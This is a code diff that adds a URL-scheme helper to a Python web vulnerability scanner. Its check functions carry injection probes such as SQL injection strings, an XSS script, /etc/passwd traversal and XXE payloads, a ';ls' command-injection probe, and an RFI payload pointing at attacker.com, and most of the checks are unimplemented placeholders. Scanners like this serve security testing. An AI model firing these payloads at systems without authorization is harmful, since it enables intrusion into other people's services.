@@ -2,8 +2,15 @@ import requests
 from bs4 import BeautifulSoup
 import argparse
 
+# Function to ensure URL has a scheme
+def ensure_scheme(url):
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+    return url
+
 # Function to check for SQL Injection vulnerability
 def check_sql_injection(url):
+    url = ensure_scheme(url)
     payload = "' OR '1'='1"
     injected_url = f"{url}?id={payload}"
 
@@ -16,6 +23,7 @@ def check_sql_injection(url):
 
 # Function to check for XSS vulnerability
 def check_xss(url):
+    url = ensure_scheme(url)
     payload = "<script>alert('XSS Vulnerability')</script>"
     injected_url = f"{url}?input={payload}"
 
@@ -28,6 +36,7 @@ def check_xss(url):
 
 # Function to check for Directory Traversal vulnerability
 def check_directory_traversal(url):
+    url = ensure_scheme(url)
     payload = "../../../../../../../../../etc/passwd"
     injected_url = f"{url}?file={payload}"
 
@@ -40,6 +49,7 @@ def check_directory_traversal(url):
 
 # Function to check for Command Injection vulnerability
 def check_command_injection(url):
+    url = ensure_scheme(url)
     payload = ";ls"
     injected_url = f"{url};{payload}"
 
@@ -52,65 +62,76 @@ def check_command_injection(url):
 
 # Function to check for CSRF vulnerability
 def check_csrf(url):
+    url = ensure_scheme(url)
     payload = "attacker-controlled-data"
     # Placeholder for CSRF check logic
     print("CSRF check logic not implemented.")
 
 # Function to check for Remote Code Execution vulnerability
 def check_remote_code_execution(url):
+    url = ensure_scheme(url)
     payload = "attacker-controlled-command"
     # Placeholder for RCE check logic
     print("Remote Code Execution check logic not implemented.")
 
 # Function to check for Sensitive Data Exposure vulnerability
 def check_sensitive_data_exposure(url):
+    url = ensure_scheme(url)
     payload = "sensitive-data"
     # Placeholder for sensitive data exposure check logic
     print("Sensitive Data Exposure check logic not implemented.")
 
 # Function to check for XML External Entity (XXE) vulnerability
 def check_xxe(url):
+    url = ensure_scheme(url)
     payload = "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
     # Placeholder for XXE check logic
     print("XXE check logic not implemented.")
 
 # Function to check for Server-Side Request Forgery (SSRF) vulnerability
 def check_ssrf(url):
+    url = ensure_scheme(url)
     payload = "http://localhost:8080/private"
     # Placeholder for SSRF check logic
     print("SSRF check logic not implemented.")
 
 # Function to check for Remote File Inclusion (RFI) vulnerability
 def check_rfi(url):
+    url = ensure_scheme(url)
     payload = "http://attacker.com/malicious.php"
     # Placeholder for RFI check logic
     print("Remote File Inclusion check logic not implemented.")
 
 # Function to check for Local File Inclusion (LFI) vulnerability
 def check_lfi(url):
+    url = ensure_scheme(url)
     payload = "../../../../../../../../../etc/passwd"
     # Placeholder for LFI check logic
     print("Local File Inclusion check logic not implemented.")
 
 # Function to check for Cross-Site Script Inclusion (XSSI) vulnerability
 def check_xssi(url):
+    url = ensure_scheme(url)
     payload = "<script>alert('XSSI Vulnerability')</script>"
     # Placeholder for XSSI check logic
     print("Cross-Site Script Inclusion check logic not implemented.")
 
 # Function to check for Blind SQL Injection vulnerability
 def check_sql_injection_blind(url):
+    url = ensure_scheme(url)
     payload = "' AND SLEEP(5) --"
     # Placeholder for Blind SQL Injection check logic
     print("Blind SQL Injection check logic not implemented.")
 
 # Function to check for CORS Misconfiguration vulnerability
 def check_cors_misconfiguration(url):
+    url = ensure_scheme(url)
     # Placeholder for CORS Misconfiguration check logic
     print("CORS Misconfiguration check logic not implemented.")
 
 # Function to check for Insecure Direct Object References (IDOR) vulnerability
 def check_idor(url):
+    url = ensure_scheme(url)
     user_id = 1
     injected_url = f"{url}?user_id={user_id}"
 
@@ -123,18 +144,21 @@ def check_idor(url):
 
 # Function to check for Insecure Authentication vulnerability
 def check_insecure_authentication(url):
+    url = ensure_scheme(url)
     payload = "attacker"
     # Placeholder for Insecure Authentication check logic
     print("Insecure Authentication check logic not implemented.")
 
 # Function to check for Server-Side Template Injection (SSTI) vulnerability
 def check_ssti(url):
+    url = ensure_scheme(url)
     payload = "{{7*7}}"
     # Placeholder for SSTI check logic
     print("Server-Side Template Injection check logic not implemented.")
 
 # Function to check for Remote Code Execution (RCE) vulnerability
 def check_rce(url):
+    url = ensure_scheme(url)
     payload = "system('ls')"
     # Placeholder for RCE check logic
     print("Remote Code Execution check logic not implemented.")
